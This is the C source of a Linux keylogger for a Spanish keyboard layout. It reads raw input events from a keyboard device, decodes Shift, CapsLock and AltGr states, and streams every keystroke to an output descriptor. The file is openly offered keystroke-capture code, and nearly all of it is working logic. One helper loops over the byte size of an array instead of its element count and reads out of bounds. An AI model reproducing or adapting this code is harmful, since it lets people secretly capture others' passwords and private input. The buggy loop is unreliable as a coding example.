/*
 * keylogger.c
 *
 *  Created on: 22 abr. 2019
 *      Author: luis
 */


#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include "keylogger.h"

#define BUFFER_SIZE 100
#define NUM_KEYCODES 71		// FIXME

#define RIGHT_SHIFT_CODE 54
#define LEFT_SHIFT_CODE 42
#define CAPSLOCK_CODE 58
#define RIGHT_ALT_CODE 100

const char *es_keycodes[] = {
    "RESERVED",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "'",
    "¡",
    "BACKSPACE",
    "TAB",
    "q",
    "w",
    "e",
    "r",
    "t",
    "y",
    "u",
    "i",
    "o",
    "p",
    "`",
    "+",
    "ENTER",
    "LEFTCTRL",
    "a",
    "s",
    "d",
    "f",
    "g",
    "h",
    "j",
    "k",
    "l",
    "ñ",
    "´",
    "º",
    "LEFTSHIFT",
    "ç",
    "z",
    "x",
    "c",
    "v",
    "b",
    "n",
    "m",
    ",",
    ".",
    "-",
    "RIGHTSHIFT",
    "RESERVED",
    "LEFTALT" ,
    "SPACE",
    "CAPSLOCK",
};

const char *upper_es_keycodes[] = {
    "RESERVED",
    "ESC",
    "!",
    "\"",
    "·",
    "$",
    "%",
    "&",
    "/",
    "(",
    ")",
    "=",
    "?",
    "¿",
    "BACKSPACE",
    "TAB",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "^",
    "*",
    "ENTER",
    "LEFTCTRL",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "Ñ",
    "¨",
    "ª",
    "LEFTSHIFT",
    "Ç",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    ";",
    ":",
    "_",
    "RIGHTSHIFT",
    "RESERVED",
    "LEFTALT" ,
    "SPACE",
    "CAPSLOCK",
};

const char *alt_es_keycodes[] = {
    "RESERVED",
    "ESC",
    "|",
    "@",
    "#",
    "~",
    "½",
    "¬",
    "{",
    "[",
    "]",
    "}",
    "\\",
    "~",
    "BACKSPACE",
    "TAB",
    "@",
    "ł",
    "€",
    "¶",
    "ŧ",
    "←",
    "↓",
    "→",
    "ø",
    "þ",
    "[",
    "]",
    "ENTER",
    "LEFTCTRL",
    "æ",
    "ß",
    "ð",
    "đ",
    "ŋ",
    "ħ",
    "̉",
    "ĸ",
    "ł",
    "~",
    "{",
    "\\",
    "LEFTSHIFT",
    "}",
    "«",
    "»",
    "¢",
    "“",
    "“",
    "n",
    "µ",
    "",
    "·",
    "̣̣",
    "RIGHTSHIFT",
    "RESERVED",
    "LEFTALT" ,
    "SPACE",
    "CAPSLOCK",
};


/**
 * From Q to P
 * From A to P and Ç
 * From Z to M
 */
const int es_capital_keycodes[] = {
	16,17,18,19,20,21,22,23,24,25,
	30,31,32,33,34,35,36,37,38,39,43,
	44,45,46,47,48,49,50
};


int loop = 1;

void sigint_handler(int sig) {
    loop = 0;
}

int codeInCapsLockList(int keycode);

/**
 * Ensures that the string pointed to by str is written to the file with file
 * descriptor file_desc.
 *
 * \returns 1 if writing completes succesfully, else 0
 */
int write_all(int file_desc, const char *str) {
    int bytesWritten = 0;
    int bytesToWrite = strlen(str) + 1;

    do {
        bytesWritten = write(file_desc, str, bytesToWrite);

        if (bytesWritten == -1) {
            return 0;
        }

        bytesToWrite -= bytesWritten;
        str += bytesWritten;
    } while(bytesToWrite > 0);

    return 1;
}

/**
 * Wrapper around write_all which exits safely if the write fails, without
 * the SIGPIPE terminating the program abruptly.
 */
void safe_write_all(int file_desc, const char *str, int keyboard) {
    struct sigaction new_actn, old_actn;
    new_actn.sa_handler = SIG_IGN;
    sigemptyset(&new_actn.sa_mask);
    new_actn.sa_flags = 0;

    sigaction(SIGPIPE, &new_actn, &old_actn);

    if (!write_all(file_desc, str)) {
        close(file_desc);
        close(keyboard);
        perror("\nwriting");
        exit(1);
    }

    sigaction(SIGPIPE, &old_actn, NULL);
}

void keylogger(int keyboard, int writeout) {
    int eventSize = sizeof(struct input_event);
    int bytesRead = 0;
    struct input_event events[NUM_EVENTS];
    int i;

    int capslock_activated = 0;
    int shift_activated = 0;
    int altgr_activated = 0;

    signal(SIGINT, sigint_handler);
    while(loop) {
        bytesRead = read(keyboard, events, eventSize * NUM_EVENTS);

        for (i = 0; i < (bytesRead / eventSize); ++i) {
            if (events[i].type == EV_KEY) {

            	// Shift checking
            	if ((events[i].value == 1)	// Pressed
            			&& ((events[i].code == LEFT_SHIFT_CODE) || (events[i].code == RIGHT_SHIFT_CODE))) {
            		shift_activated = 1;
            	}

            	if ((events[i].value == 0)	// Released
            			&& ((events[i].code == LEFT_SHIFT_CODE) || (events[i].code == RIGHT_SHIFT_CODE))) {
            		shift_activated = 0;
            	}

            	// AtlGr checking
            	if ((events[i].value == 1)	// Pressed
            			&& (events[i].code == RIGHT_ALT_CODE)) {
            		altgr_activated = 1;
            	}

            	if ((events[i].value == 0)	// Released
            			&& (events[i].code == RIGHT_ALT_CODE)) {
            		altgr_activated = 0;
            	}

            	//printf("->%d<-\n", events[i].code);
            	if (events[i].value == 1) {
            		// Check if capslock key is activated
            		if (events[i].code == CAPSLOCK_CODE) {
                		capslock_activated = (capslock_activated + 1) % 2;
                	}

                	if (events[i].code > 0 && events[i].code < NUM_KEYCODES) {
                		int inCapsList = codeInCapsLockList(events[i].code);

                		/*
                		if (((capslock_activated == 1) && (inCapsList == 1)) || (shift_activated == 1)) {
							safe_write_all(writeout, upper_es_keycodes[events[i].code], keyboard);
                		} else if (altgr_activated == 1) {
							safe_write_all(writeout, alt_es_keycodes[events[i].code], keyboard);
                		} else {
							safe_write_all(writeout, es_keycodes[events[i].code], keyboard);
                		}
                		*/

                		if (shift_activated == 1) {
                			if ((capslock_activated == 1) && (inCapsList == 1)) {
                				safe_write_all(writeout, es_keycodes[events[i].code], keyboard);
                			} else {
                				safe_write_all(writeout, upper_es_keycodes[events[i].code], keyboard);
                			}
                		} else if ((capslock_activated == 1) && (inCapsList == 1)) {
                			safe_write_all(writeout, upper_es_keycodes[events[i].code], keyboard);
                		} else if (altgr_activated == 1) {
                			safe_write_all(writeout, alt_es_keycodes[events[i].code], keyboard);
                		} else {
                			safe_write_all(writeout, es_keycodes[events[i].code], keyboard);
                		}

				safe_write_all(writeout, "\n", keyboard);

                    } else {
                    	write(writeout, "UNRECOGNIZED\n", sizeof("UNRECOGNIZED"));
                    }
                }
            }
        }
    }

    if(bytesRead > 0) safe_write_all(writeout, "\n", keyboard);
}

/**
 * Checks if the keycode represents a capital letter or not 
 */
int codeInCapsLockList(int keycode) {

	for (int i = 0; i < sizeof(es_capital_keycodes); i++) {
		if (es_capital_keycodes[i] == keycode) {
			return 1;
		}
	}
	return 0;
}
